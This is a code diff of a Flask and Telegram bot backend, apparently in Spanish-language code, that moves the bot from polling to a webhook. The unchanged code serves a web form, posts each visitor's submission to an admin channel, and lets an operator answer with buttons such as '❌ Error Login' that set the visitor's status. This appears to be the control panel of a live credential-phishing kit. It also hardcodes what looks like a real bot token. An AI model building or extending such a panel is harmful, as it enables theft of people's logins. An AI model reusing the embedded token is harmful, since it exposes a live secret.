@@ -1,5 +1,4 @@
 import os
-import threading
 import logging
 import json
 import traceback
@@ -12,6 +11,10 @@ logging.basicConfig(level=logging.INFO)
 
 TOKEN = os.environ.get("BOT_TOKEN", "8371195355:AAFa7xJjZJeO9JxlbgEE0eHXB3vPa8fHMo0")
 CANAL_ADMIN_ID = int(os.environ.get("CANAL_ADMIN_ID", "-1003904819480"))
+
+# URL de tu servidor en Render (sin la '/' al final)
+RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://backend-oa88.onrender.com").rstrip('/')
+
 ARCH_ESTADOS = "estados_usuarios.json"
 
 app = Flask(__name__, static_folder='.', static_url_path='')
@@ -19,7 +22,7 @@ CORS(app)
 
 bot = telebot.TeleBot(TOKEN)
 
-# --- SISTEMA DE PERSISTENCIA (Sustituye la memoria RAM) ---
+# --- SISTEMA DE PERSISTENCIA ---
 def leer_estados():
     if not os.path.exists(ARCH_ESTADOS):
         return {}
@@ -35,9 +38,9 @@ def guardar_estado(user_id, status):
     try:
         with open(ARCH_ESTADOS, "w", encoding="utf-8") as f:
             json.dump(estados, f)
-        print(f"💾 ESTADO GUARDADO EN DISCO: {user_id} -> {status}")
+        print(f"💾 ESTADO GUARDADO: {user_id} -> {status}")
     except Exception as e:
-        print(f"❌ Error al escribir en disco: {e}")
+        print(f"❌ Error guardando estado: {e}")
 
 def obtener_estado(user_id):
     estados = leer_estados()
@@ -45,7 +48,6 @@ def obtener_estado(user_id):
 
 
 def crear_teclado_admin(user_id):
-    """Genera la botonera remota de 10 opciones para Telegram."""
     markup = InlineKeyboardMarkup(row_width=2)
     btn_opt1 = InlineKeyboardButton("❌ Error Login", callback_data=f"admin:A:{user_id}")
     btn_opt2 = InlineKeyboardButton("❌ Error Login", callback_data=f"admin:B:{user_id}")
@@ -64,6 +66,17 @@ def crear_teclado_admin(user_id):
 @app.route('/', methods=['GET'])
 def home():
     return app.send_static_file('index.html')
+
+
+# --- ENDPOINT DONDE TELEGRAM NOTIFICA LOS CLICS EN BOTONES ---
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    if request.headers.get('content-type') == 'application/json':
+        json_string = request.get_data().decode('utf-8')
+        update = telebot.types.Update.de_json(json_string)
+        bot.process_new_updates([update])
+        return "OK", 200
+    return "Forbidden", 403
 
 
 @app.route('/api/formulario', methods=['POST'])
@@ -131,30 +144,26 @@ def procesar_respuesta_admin(call):
     try:
         # Responder a Telegram inmediatamente
         try:
-            bot.answer_callback_query(call.id, "Acción registrada...")
+            bot.answer_callback_query(call.id, "Procesando respuesta...")
         except Exception:
             pass
 
-        # Extraer parámetros
         partes = call.data.split(':')
         opcion = partes[1].strip()
         target_user_id = partes[2].strip()
         admin_name = call.from_user.first_name or "Admin"
 
-        # 1. PASO CRÍTICO: Guardar en disco antes de interactuar con Telegram
+        # 1. ACTUALIZAR EL ESTADO
         guardar_estado(target_user_id, opcion)
+        print(f"✅ RECIBIDO CLIC EN WEBHOOK: Usuario {target_user_id} -> {opcion}")
 
-        # 2. Intentar actualizar el mensaje en el canal (independiente del paso 1)
+        # 2. Modificar el mensaje en Telegram
         try:
             bot.edit_message_reply_markup(
                 chat_id=call.message.chat.id,
                 message_id=call.message.message_id,
                 reply_markup=None
             )
-        except Exception as e_markup:
-            print(f"⚠️ No se pudo remover la botonera: {e_markup}")
-
-        try:
             texto_original = call.message.text or ""
             texto_actualizado = (
                 f"{texto_original}\n\n"
@@ -167,23 +176,25 @@ def procesar_respuesta_admin(call):
                 message_id=call.message.message_id,
                 text=texto_actualizado
             )
-        except Exception as e_text:
-            print(f"⚠️ No se pudo editar el texto del mensaje: {e_text}")
+        except Exception as e_edit:
+            print(f"⚠️ No se pudo editar el mensaje en Telegram: {e_edit}")
 
     except Exception as e:
         print("❌ Error en callback handler:")
         traceback.print_exc()
 
 
-def iniciar_bot():
+# Registrar el Webhook en Telegram al arrancar la aplicación
+def configurar_webhook():
     try:
+        url_webhook = f"{RENDER_URL}/webhook"
         bot.remove_webhook()
-        bot.infinity_polling(timeout=10, long_polling_timeout=5)
+        bot.set_webhook(url=url_webhook)
+        print(f"🔗 WEBHOOK ACTIVADO EN: {url_webhook}")
     except Exception as e:
-        print(f"❌ Error en el loop del bot: {e}")
+        print(f"❌ Error activando Webhook: {e}")
 
-
-threading.Thread(target=iniciar_bot, daemon=True).start()
+configurar_webhook()
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
